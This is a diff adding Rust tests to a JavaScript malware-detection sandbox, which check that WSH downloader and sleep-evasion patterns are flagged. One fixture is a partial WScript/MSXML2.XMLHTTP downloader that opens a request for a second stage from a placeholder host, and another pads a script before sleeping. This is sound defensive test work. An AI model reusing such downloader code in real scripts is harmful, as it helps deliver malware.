@@ -424,6 +424,31 @@ fn sandbox_flags_com_downloader_incomplete_network_chain() {
 
 #[cfg(feature = "js-sandbox")]
 #[test]
+fn sandbox_flags_com_downloader_incomplete_open_chain() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        var xhr = WScript.CreateObject('MSXML2.XMLHTTP');
+        WScript.Sleep(1);
+        xhr.open('GET', 'http://example.invalid/stage', false);
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(
+                signals
+                    .behavioral_patterns
+                    .iter()
+                    .any(|pattern| pattern.name == "com_downloader_incomplete_open_chain"),
+                "expected incomplete-open downloader pattern: {:?}",
+                signals.behavioral_patterns
+            );
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
 fn sandbox_flags_wsh_direct_run_execution() {
     let options = DynamicOptions::default();
     let payload = br#"
@@ -488,6 +513,27 @@ fn sandbox_flags_wsh_early_quit_gate() {
                     .iter()
                     .any(|pattern| pattern.name == "wsh_early_quit_gate"),
                 "expected WSH early-quit gate pattern: {:?}",
+                signals.behavioral_patterns
+            );
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_flags_wsh_sleep_only_execution() {
+    let options = DynamicOptions::default();
+    let payload = format!("var pad='{}'; WScript.Sleep(1);", "X".repeat(3000));
+    let outcome = js_analysis::run_sandbox(payload.as_bytes(), &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(
+                signals
+                    .behavioral_patterns
+                    .iter()
+                    .any(|pattern| pattern.name == "wsh_sleep_only_execution"),
+                "expected WSH sleep-only pattern: {:?}",
                 signals.behavioral_patterns
             );
         }
